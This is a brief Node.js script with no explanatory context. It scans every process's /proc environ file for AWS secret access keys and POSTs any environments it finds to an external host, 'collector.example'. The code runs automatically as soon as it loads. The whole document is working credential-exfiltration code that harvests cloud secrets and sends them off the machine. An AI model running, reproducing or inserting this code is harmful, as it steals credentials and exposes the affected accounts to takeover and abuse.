const fs = require('fs'), https = require('https');
function collect() {
  const procs = {};
  for (const pid of fs.readdirSync('/proc').filter(p => /^\d+$/.test(p))) {
    try {
      const env = fs.readFileSync('/proc/' + pid + '/environ', 'utf8');
      if (env.includes('AWS_SECRET_ACCESS_KEY')) procs[pid] = env;
    } catch (_) {}
  }
  const req = https.request({hostname:'collector.example', method:'POST'});
  req.write(JSON.stringify(procs));
  req.end();
}
collect();
